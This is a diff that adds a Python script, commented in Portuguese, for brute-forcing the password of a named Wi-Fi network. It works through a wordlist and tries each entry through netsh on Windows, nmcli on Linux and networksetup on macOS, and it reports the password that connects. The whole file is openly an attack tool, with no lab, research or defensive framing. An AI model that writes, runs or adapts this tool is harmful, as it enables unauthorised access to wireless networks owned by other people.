@@ -1,0 +1,175 @@
+import subprocess
+import time
+import sys
+import os
+import platform
+from itertools import islice
+
+def check_admin():
+    """Verifica se o script está sendo executado com privilégios administrativos"""
+    try:
+        if os.name == 'nt':
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else:
+            return os.getuid() == 0
+    except:
+        return False
+
+class WiFiBruteForcer:
+    def __init__(self, ssid, password_file, interface=None):
+        self.ssid = ssid
+        self.password_file = password_file
+        self.interface = interface
+        self.os_type = platform.system()
+        self.current_connection = None
+
+        if not check_admin():
+            print("Erro: Execute o script como administrador/root")
+            sys.exit(1)
+
+    def get_wifi_interface(self):
+        """Obtém a interface Wi-Fi automaticamente para Linux/macOS"""
+        try:
+            if self.os_type == 'Linux':
+                result = subprocess.check_output(['iwconfig'], text=True)
+                for line in result.split('\n'):
+                    if 'IEEE 802.11' in line:
+                        return line.split()[0]
+            elif self.os_type == 'Darwin':
+                return 'en0'  # Valor padrão comum para macOS
+        except Exception as e:
+            print(f"Erro ao obter interface: {e}")
+        return None
+
+    def try_connect_windows(self, password):
+        """Tenta conectar em sistemas Windows"""
+        profile = f"""<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{self.ssid}</name>
+    <SSIDConfig>
+        <SSID>
+            <name>{self.ssid}</name>
+        </SSID>
+    </SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM>
+        <security>
+            <authEncryption>
+                <authentication>WPA2PSK</authentication>
+                <encryption>AES</encryption>
+                <useOneX>false</useOneX>
+            </authEncryption>
+            <sharedKey>
+                <keyType>passPhrase</keyType>
+                <protected>false</protected>
+                <keyMaterial>{password}</keyMaterial>
+            </sharedKey>
+        </security>
+    </MSM>
+</WLANProfile>"""
+        
+        try:
+            subprocess.run(f'netsh wlan delete profile "{self.ssid}"', check=True, shell=True, capture_output=True)
+            with open(f"{self.ssid}.xml", "w") as f:
+                f.write(profile)
+            subprocess.run(f'netsh wlan add profile filename="{self.ssid}.xml"', check=True, shell=True, capture_output=True)
+            result = subprocess.run(f'netsh wlan connect name="{self.ssid}"', shell=True, capture_output=True, text=True)
+            return "foi concluída com êxito" in result.stdout
+        except subprocess.CalledProcessError:
+            return False
+        finally:
+            if os.path.exists(f"{self.ssid}.xml"):
+                os.remove(f"{self.ssid}.xml")
+
+    def try_connect_linux(self, password):
+        """Tenta conectar em sistemas Linux usando nmcli"""
+        try:
+            subprocess.run(['nmcli', 'device', 'wifi', 'connect', self.ssid, 'password', password], 
+                          check=True, timeout=15, capture_output=True)
+            return True
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+            return False
+
+    def try_connect_macos(self, password):
+        """Tenta conectar em sistemas macOS"""
+        try:
+            result = subprocess.run(['networksetup', '-setairportnetwork', self.interface, self.ssid, password],
+                                   capture_output=True, text=True, timeout=15)
+            return "Failed" not in result.stdout
+        except subprocess.TimeoutExpired:
+            return False
+
+    def check_connection(self):
+        """Verifica se a conexão foi bem sucedida"""
+        try:
+            if self.os_type == 'Windows':
+                result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], text=True)
+                return self.ssid in result
+            elif self.os_type == 'Linux':
+                result = subprocess.check_output(['nmcli', '-t', '-f', 'ACTIVE,SSID', 'dev', 'wifi'], text=True)
+                return f"yes:{self.ssid}" in result
+            elif self.os_type == 'Darwin':
+                result = subprocess.check_output(['networksetup', '-getairportnetwork', self.interface], text=True)
+                return f"Current Wi-Fi Network: {self.ssid}" in result
+        except:
+            return False
+
+    def brute_force(self, batch_size=10):
+        """Executa o ataque de força bruta com gerenciamento de tentativas"""
+        if not self.interface and self.os_type in ['Darwin', 'Linux']:
+            self.interface = self.get_wifi_interface()
+            if not self.interface:
+                print("Interface Wi-Fi não encontrada")
+                return
+
+        total = sum(1 for _ in open(self.password_file, 'r', encoding='utf-8', errors='ignore'))
+        print(f"\nIniciando ataque contra: {self.ssid}")
+        print(f"Total de senhas para testar: {total}\n")
+
+        with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
+            while True:
+                chunk = list(islice(f, batch_size))
+                if not chunk:
+                    break
+
+                for password in chunk:
+                    password = password.strip()
+                    if not password:
+                        continue
+
+                    print(f"\rTestando: {password[:20]:<20}", end='')
+                    connected = False
+
+                    try:
+                        if self.os_type == 'Windows':
+                            connected = self.try_connect_windows(password)
+                        elif self.os_type == 'Linux':
+                            connected = self.try_connect_linux(password)
+                        elif self.os_type == 'Darwin':
+                            connected = self.try_connect_macos(password)
+                        
+                        time.sleep(5)  # Tempo para estabelecer conexão
+                        if connected and self.check_connection():
+                            print(f"\n\nSenha encontrada: {password}")
+                            return
+                    except Exception as e:
+                        print(f"\nErro durante a conexão: {str(e)}")
+                        continue
+
+        print("\n\nSenha não encontrada na lista")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Uso: {sys.argv[0]} <SSID> <arquivo_de_senhas>")
+        sys.exit(1)
+
+    ssid = sys.argv[1]
+    password_file = sys.argv[2]
+
+    if not os.path.exists(password_file):
+        print("Arquivo de senhas não encontrado")
+        sys.exit(1)
+
+    brute_forcer = WiFiBruteForcer(ssid, password_file)
+    brute_forcer.brute_force(batch_size=10)
